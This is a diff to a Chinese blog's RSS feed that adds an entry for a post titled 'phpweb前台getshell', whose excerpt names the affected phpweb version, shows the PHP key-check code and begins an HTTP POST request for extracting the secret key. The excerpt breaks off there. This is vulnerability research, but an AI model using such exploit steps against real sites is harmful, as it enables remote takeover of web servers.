@@ -6,10 +6,19 @@
     <description>Recent content in web dev on AD钙奶的博客</description>
     <generator>Hugo -- gohugo.io</generator>
     <copyright>CC BY 4.0 CN</copyright>
-    <lastBuildDate>Mon, 20 Feb 2023 00:00:00 +0000</lastBuildDate>
+    <lastBuildDate>Mon, 13 Mar 2023 00:00:00 +0000</lastBuildDate>
     
         <atom:link href="https://ad-calcium.github.io/series/web-dev/index.xml" rel="self" type="application/rss+xml" />
     
+    
+    <item>
+      <title>phpweb前台getshell</title>
+      <link>https://ad-calcium.github.io/2021/07/phpweb%E5%89%8D%E5%8F%B0getshell/</link>
+      <pubDate>Wed, 14 Jul 2021 00:00:00 +0000</pubDate>
+      
+      <guid>https://ad-calcium.github.io/2021/07/phpweb%E5%89%8D%E5%8F%B0getshell/</guid>
+      <description>0x01 影响范围 版本 2.0.35 0x02 测试环境： windows 2008 + PHPnow1.6.5 + phpwebV2.0.35 秘钥加密方式 $k=md5(strrev($dbUser.$dbPass)); $h=$_SERVER[&amp;quot;HTTP_REFERER&amp;quot;]; $t=$_POST[&amp;quot;t&amp;quot;]; $m=$_POST[&amp;quot;m&amp;quot;]; $act=$_POST[&amp;quot;act&amp;quot;]; $path=$_POST[&amp;quot;path&amp;quot;]; $md5=md5($k.$t); if($m!=$md5){ echo &amp;quot;ERROR: 安全性校验错误&amp;quot;; } 0x03 漏洞检测方法 1、获取秘钥 POST /3151/base/post.php HTTP/1.1 Host: 192.168.59.138 User-Agent:</description>
+    </item>
     
     <item>
       <title>离线安装docker</title>
